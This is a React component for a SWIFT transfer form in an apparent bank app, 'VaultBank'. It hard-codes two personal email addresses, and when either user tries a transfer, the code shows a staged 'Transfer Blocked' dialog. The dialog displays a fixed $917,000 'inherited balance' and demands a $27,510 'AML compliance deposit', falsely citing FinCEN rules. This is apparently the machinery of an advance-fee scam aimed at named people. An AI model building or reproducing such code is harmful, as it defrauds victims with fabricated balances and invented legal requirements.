import { useState, useEffect } from "react";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import { useNavigate } from "react-router-dom";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { TransferReceipt } from "./TransferReceipt";
import { OTPVerificationModal } from "./OTPVerificationModal";
import { Globe, AlertTriangle, ShieldAlert, Phone, Mail, MessageSquare } from "lucide-react";
import { createNotification, NotificationTemplates } from "@/lib/notifications";
import bankLogo from "@/assets/vaultbank-logo.png";
import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogHeader, AlertDialogTitle, AlertDialogFooter, AlertDialogCancel } from "@/components/ui/alert-dialog";

interface InternationalTransferModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export function InternationalTransferModal({ onClose, onSuccess }: InternationalTransferModalProps) {
  const navigate = useNavigate();
  const { playSound } = useNotificationSound();
  const [accounts, setAccounts] = useState<any[]>([]);
  const [profile, setProfile] = useState<any>(null);
  const [fromAccount, setFromAccount] = useState("");
  const [recipientName, setRecipientName] = useState("");
  const [recipientAddress, setRecipientAddress] = useState("");
  const [recipientBank, setRecipientBank] = useState("");
  const [recipientBankAddress, setRecipientBankAddress] = useState("");
  const [swiftCode, setSwiftCode] = useState("");
  const [iban, setIban] = useState("");
  const [intermediaryBank, setIntermediaryBank] = useState("");
  const [currency, setCurrency] = useState("EUR");
  const [amount, setAmount] = useState("");
  const [purpose, setPurpose] = useState("");
  const [feeOption, setFeeOption] = useState<"SHA" | "OUR" | "BEN">("SHA");
  const [loading, setLoading] = useState(false);
  const [showReceipt, setShowReceipt] = useState(false);
  const [receiptData, setReceiptData] = useState<any>(null);
  const [showLoadingSpinner, setShowLoadingSpinner] = useState(false);
  const [showOTP, setShowOTP] = useState(false);
  const [pendingTransfer, setPendingTransfer] = useState<any>(null);
  const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
  const [totalBalance, setTotalBalance] = useState(0);
  const [showInheritanceOTP, setShowInheritanceOTP] = useState(false);
  const [inheritanceOTPLoading, setInheritanceOTPLoading] = useState(false);
  const [isAccountRestricted, setIsAccountRestricted] = useState(false);

  useEffect(() => {
    fetchAccounts();
    fetchProfile();
  }, []);

  const fetchProfile = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { data } = await supabase
      .from("profiles")
      .select("*")
      .eq("id", user.id)
      .single();

    setProfile(data);
  };

  const fetchAccounts = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) {
      console.log("No user found in InternationalTransferModal");
      return;
    }

    const { data } = await supabase
      .from("accounts")
      .select("*")
      .eq("user_id", user.id)
      .eq("status", "active");

    console.log("Accounts fetched in InternationalTransferModal:", data);
    setAccounts(data || []);
    // Calculate total balance for inheritance warning
    const total = (data || []).reduce((sum, acc) => sum + parseFloat(String(acc.balance || 0)), 0);
    setTotalBalance(total);
  };

  const handleTransfer = async () => {
    // Check if account is restricted
    if (profile?.can_transact === false) {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        await createNotification({
          userId: user.id,
          title: "Account Restricted",
          message: "Your account has been restricted and transfer can't be made on this account until further notice, kindly visit support center for further assistance.",
          type: "error"
        });
      }
      // Show receipt with restricted message
      const selectedAccount = accounts.find(a => a.id === fromAccount) || accounts[0];
      setReceiptData({
        type: 'international' as const,
        fromAccount: selectedAccount?.account_type || 'Account',
        toAccount: recipientName || 'Recipient',
        recipientName: recipientName || 'N/A',
        recipientBank: recipientBank || 'N/A',
        amount: amount || '0.00',
        currency: currency || '$',
        reference: `INT${Date.now()}${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
        date: new Date(),
        swiftCode: swiftCode,
        accountNumber: iban
      });
      setIsAccountRestricted(true);
      setShowReceipt(true);
      return;
    }

    if (!fromAccount || !recipientName || !recipientAddress || !recipientBank || !swiftCode || !iban || !amount || !purpose) {
      toast.error("Please fill in all required fields");
      return;
    }

    if (swiftCode.length < 8 || swiftCode.length > 11) {
      toast.error("SWIFT code must be 8-11 characters");
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }

    // Check if user is in the restricted inheritance accounts
    const restrictedEmails = ["annanbelle72@gmail.com", "ultimateambahe@gmail.com"];
    if (restrictedEmails.includes(profile?.email?.toLowerCase())) {
      setShowInheritanceOTP(true);
      return;
    }

    // Store transfer data and show OTP modal
    const selectedAccount = accounts.find(a => a.id === fromAccount);
    const fee = "45.00";
    const reference = `SWIFT${Date.now()}${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
    
    setPendingTransfer({
      fromAccount,
      selectedAccount,
      transferAmount,
      fee,
      reference
    });
    setShowOTP(true);
  };

  const handleOTPVerified = async () => {
    setShowOTP(false);
    setLoading(true);
    setShowLoadingSpinner(true);
    
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not authenticated");

      // Get current account balance
      const { data: accountData } = await supabase
        .from("accounts")
        .select("balance")
        .eq("id", pendingTransfer.fromAccount)
        .single();

      if (!accountData) throw new Error("Account not found");

      const currentBalance = parseFloat(String(accountData.balance) || '0');
      const newBalance = currentBalance - pendingTransfer.transferAmount;

      if (newBalance < 0) {
        throw new Error("Insufficient funds");
      }

      // Update account balance and create transfer/transaction in parallel
      const [transferResult, transactionResult] = await Promise.all([
        supabase.from("transfers").insert({
          user_id: user.id,
          from_account: pendingTransfer.fromAccount,
          to_account: iban,
          amount: pendingTransfer.transferAmount,
          status: "pending"
        }),
        supabase.from("transactions").insert({
          user_id: user.id,
          account_id: pendingTransfer.fromAccount,
          type: "debit",
          amount: pendingTransfer.transferAmount,
          description: `International SWIFT Transfer to ${recipientName} (${currency}) - Pending`,
          status: "pending"
        })
      ]);

      if (transferResult.error) throw transferResult.error;
      if (transactionResult.error) throw transactionResult.error;
      
      // Send pending notification
      await createNotification({
        userId: user.id,
        title: "Transfer Pending",
        message: `Your international transfer of $${pendingTransfer.transferAmount.toFixed(2)} to ${recipientName} via SWIFT is pending`,
        type: "pending"
      });
      
      setTimeout(() => {
        setShowLoadingSpinner(false);
        setReceiptData({
          type: 'international',
          fromAccount: pendingTransfer.selectedAccount?.account_type || '',
          toAccount: iban,
          recipientName,
          recipientBank,
          amount: pendingTransfer.transferAmount.toFixed(2),
          currency: getCurrencySymbol(currency),
          reference: pendingTransfer.reference,
          date: new Date(),
          fee: pendingTransfer.fee,
          swiftCode,
          accountNumber: iban,
          status: 'pending'
        });
        setShowReceipt(true);
        onSuccess();
        toast.success("Transfer submitted and pending");
      }, 2000);
    } catch (error: any) {
      toast.error(error.message || "Transfer failed");
      setShowLoadingSpinner(false);
    } finally {
      setLoading(false);
    }
  };

  const getCurrencySymbol = (curr: string) => {
    const symbols: Record<string, string> = {
      EUR: '€',
      GBP: '£',
      USD: '$',
      JPY: '¥',
      CHF: 'CHF',
      CAD: 'C$',
      AUD: 'A$'
    };
    return symbols[curr] || curr;
  };

  return (
    <>
      <Dialog open={!showReceipt} onOpenChange={onClose}>
        <DialogContent className="sm:max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Globe className="h-5 w-5" />
              International Transfer (SWIFT)
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label>From Account</Label>
              <Select value={fromAccount} onValueChange={setFromAccount}>
                <SelectTrigger>
                  <SelectValue placeholder="Select account" />
                </SelectTrigger>
                <SelectContent>
                  {accounts.length === 0 ? (
                    <div className="p-2 text-sm text-muted-foreground">No accounts available</div>
                  ) : (
                    accounts.map((account) => (
                      <SelectItem key={account.id} value={account.id}>
                        {account.account_type} - ****{account.account_number?.slice(-4) || '0000'} - ${parseFloat(account.balance || 0).toFixed(2)}
                      </SelectItem>
                    ))
                  )}
                </SelectContent>
              </Select>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Recipient Full Legal Name</Label>
                <Input
                  placeholder="Maria Gonzalez"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                />
              </div>

              <div className="space-y-2">
                <Label>Recipient Address</Label>
                <Input
                  placeholder="Calle Verde 12, Madrid, Spain"
                  value={recipientAddress}
                  onChange={(e) => setRecipientAddress(e.target.value)}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Recipient Bank Name</Label>
                <Input
                  placeholder="Banco Santander"
                  value={recipientBank}
                  onChange={(e) => setRecipientBank(e.target.value)}
                />
              </div>

              <div className="space-y-2">
                <Label>Recipient Bank Address</Label>
                <Input
                  placeholder="Madrid, Spain"
                  value={recipientBankAddress}
                  onChange={(e) => setRecipientBankAddress(e.target.value)}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>SWIFT/BIC Code</Label>
                <Input
                  placeholder="BSCHESMMXXX"
                  maxLength={11}
                  value={swiftCode}
                  onChange={(e) => setSwiftCode(e.target.value.toUpperCase())}
                />
              </div>

              <div className="space-y-2">
                <Label>IBAN / Account Number</Label>
                <Input
                  placeholder="ES91 2100 0418 4502 0005 1332"
                  value={iban}
                  onChange={(e) => setIban(e.target.value.toUpperCase())}
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label>Intermediary Bank (Optional)</Label>
              <Input
                placeholder="JPMorgan Chase Bank, SWIFT: CHASUS33"
                value={intermediaryBank}
                onChange={(e) => setIntermediaryBank(e.target.value)}
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Currency</Label>
                <Select value={currency} onValueChange={setCurrency}>
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="EUR">EUR - Euro</SelectItem>
                    <SelectItem value="GBP">GBP - British Pound</SelectItem>
                    <SelectItem value="USD">USD - US Dollar</SelectItem>
                    <SelectItem value="JPY">JPY - Japanese Yen</SelectItem>
                    <SelectItem value="CHF">CHF - Swiss Franc</SelectItem>
                    <SelectItem value="CAD">CAD - Canadian Dollar</SelectItem>
                    <SelectItem value="AUD">AUD - Australian Dollar</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label>Amount</Label>
                <Input
                  type="number"
                  step="0.01"
                  placeholder="1000.00"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label>Purpose of Payment</Label>
              <Input
                placeholder="Goods Payment"
                value={purpose}
                onChange={(e) => setPurpose(e.target.value)}
              />
            </div>

            <div className="space-y-2">
              <Label>Fee Payment Option</Label>
              <RadioGroup value={feeOption} onValueChange={(v) => setFeeOption(v as "SHA" | "OUR" | "BEN")}>
                <div className="flex items-center space-x-2 border p-3 rounded-lg">
                  <RadioGroupItem value="SHA" id="sha" />
                  <Label htmlFor="sha" className="flex-1 cursor-pointer">
                    SHA - Shared (You and recipient split fees)
                  </Label>
                </div>
                <div className="flex items-center space-x-2 border p-3 rounded-lg">
                  <RadioGroupItem value="OUR" id="our" />
                  <Label htmlFor="our" className="flex-1 cursor-pointer">
                    OUR - You pay all fees
                  </Label>
                </div>
                <div className="flex items-center space-x-2 border p-3 rounded-lg">
                  <RadioGroupItem value="BEN" id="ben" />
                  <Label htmlFor="ben" className="flex-1 cursor-pointer">
                    BEN - Recipient pays all fees
                  </Label>
                </div>
              </RadioGroup>
            </div>

            <div className="bg-muted p-4 rounded-lg">
              <p className="text-sm font-medium mb-2">Transfer Information:</p>
              <ul className="text-sm space-y-1 text-muted-foreground">
                <li>• Processing time: 1-5 business days</li>
                <li>• Outgoing wire fee: $45</li>
                <li>• Exchange rate applied at time of transfer</li>
              </ul>
            </div>
          </div>

          <div className="flex gap-2">
            <Button variant="outline" onClick={onClose} className="flex-1">
              Cancel
            </Button>
            <Button onClick={handleTransfer} disabled={loading} className="flex-1">
              {loading ? "Processing..." : "Send Transfer"}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {showOTP && (
        <OTPVerificationModal
          open={showOTP}
          onClose={() => setShowOTP(false)}
          onVerify={handleOTPVerified}
          email={profile?.email || "your email"}
          action="international_transfer"
          amount={amount}
        />
      )}

      {showInheritanceOTP && profile?.email && (
        <OTPVerificationModal
          open={showInheritanceOTP}
          onClose={() => setShowInheritanceOTP(false)}
          email={profile.email}
          action="international_transfer"
          amount={amount}
          onVerify={async () => {
            setShowInheritanceOTP(false);
            setInheritanceOTPLoading(true);
            
            // Show loading for 3 seconds
            setTimeout(async () => {
              setInheritanceOTPLoading(false);
              setShowInheritanceWarning(true);
              
              // Play inheritance alert sound
              playSound('inheritance');
              
              // Create notification
              const { data: { user } } = await supabase.auth.getUser();
              if (user) {
                const notificationData = NotificationTemplates.inheritanceDepositRequired(totalBalance);
                await createNotification({
                  userId: user.id,
                  ...notificationData
                });
              }
            }, 3000);
          }}
        />
      )}

      {showReceipt && receiptData && (
        <TransferReceipt
          open={showReceipt}
          onClose={() => {
            setShowReceipt(false);
            setIsAccountRestricted(false);
            onClose();
          }}
          transferData={receiptData}
          isRestricted={isAccountRestricted}
        />
      )}

      {(showLoadingSpinner || inheritanceOTPLoading) && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-[100] flex items-center justify-center">
          <div className="text-center space-y-4">
            <img 
              src={bankLogo} 
              alt="VaultBank" 
              className="h-20 w-auto mx-auto animate-spin"
              style={{ animationDuration: '2s' }}
            />
            <p className="text-lg font-semibold">
              {inheritanceOTPLoading ? "Verifying account access..." : "Processing your international transfer..."}
            </p>
          </div>
        </div>
      )}

      <AlertDialog open={showInheritanceWarning} onOpenChange={setShowInheritanceWarning}>
        <AlertDialogContent className="max-w-lg max-h-[90vh] overflow-y-auto bg-gradient-to-br from-[#0c1220] via-[#0a0f1a] to-[#080d14] border border-gray-700/30 p-0">
          <div className="p-6">
            <AlertDialogHeader>
              <div className="flex items-center justify-center gap-3 mb-4">
                <div className="p-3 bg-rose-500/10 rounded-full border border-rose-500/20">
                  <ShieldAlert className="h-8 w-8 text-rose-400" />
                </div>
              </div>
              <AlertDialogTitle className="text-xl font-bold text-white text-center">
                Transfer Blocked
              </AlertDialogTitle>
              <p className="text-gray-400 text-sm text-center mt-1">AML Compliance Deposit Required</p>
            </AlertDialogHeader>
            
            <AlertDialogDescription className="space-y-4 mt-6">
              {/* Balance Info Card */}
              <div className="bg-gradient-to-br from-[#0a3d62]/80 to-[#0c2840]/80 rounded-xl p-4 border border-cyan-700/30">
                <p className="text-cyan-200 text-xs mb-1">Total Inherited Account Balance</p>
                <p className="text-white text-2xl font-bold">$917,000.00</p>
                <div className="h-px bg-cyan-700/30 my-3"></div>
                <p className="text-cyan-200 text-xs mb-1">Required AML Compliance Deposit (3%)</p>
                <p className="text-rose-400 text-xl font-bold">$27,510.00</p>
              </div>

              {/* AML Notice */}
              <div className="bg-[#151c28]/80 rounded-xl p-4 border border-gray-700/30">
                <h4 className="text-amber-400 font-semibold text-sm mb-2 flex items-center gap-2">
                  <AlertTriangle className="h-4 w-4" />
                  FinCEN BSA/AML Compliance
                </h4>
                <p className="text-gray-300 text-xs leading-relaxed">
                  Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of <span className="text-white font-semibold">$27,510.00</span> is required to complete enhanced due diligence prior to fund disbursement.
                </p>
              </div>

              {/* Next Steps */}
              <div className="bg-[#151c28]/80 rounded-xl p-4 border border-gray-700/30">
                <p className="text-gray-300 text-xs leading-relaxed">
                  <span className="text-white font-semibold">Next Steps:</span> To complete the AML compliance deposit and proceed with your estate transfer, please contact our Estate Services Department through the secure support channel.
                </p>
              </div>

              {/* Contact Options */}
              <div className="flex items-center justify-center gap-4 pt-2">
                <div className="flex items-center gap-1.5 text-gray-400">
                  <Phone className="h-3.5 w-3.5" />
                  <span className="text-xs">Support</span>
                </div>
                <div className="flex items-center gap-1.5 text-gray-400">
                  <Mail className="h-3.5 w-3.5" />
                  <span className="text-xs">Email</span>
                </div>
                <div className="flex items-center gap-1.5 text-gray-400">
                  <MessageSquare className="h-3.5 w-3.5" />
                  <span className="text-xs">Chat</span>
                </div>
              </div>
            </AlertDialogDescription>
          </div>
          
          <AlertDialogFooter className="bg-[#0a0f18]/80 border-t border-gray-700/30 p-4">
            <AlertDialogCancel 
              className="w-full bg-gradient-to-r from-gray-700 to-gray-600 hover:from-gray-600 hover:to-gray-500 text-white border-0 font-medium"
              onClick={() => {
                setShowInheritanceWarning(false);
                onClose();
                navigate('/bank/dashboard');
              }}
            >
              I Understand
            </AlertDialogCancel>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

    </>
  );
}
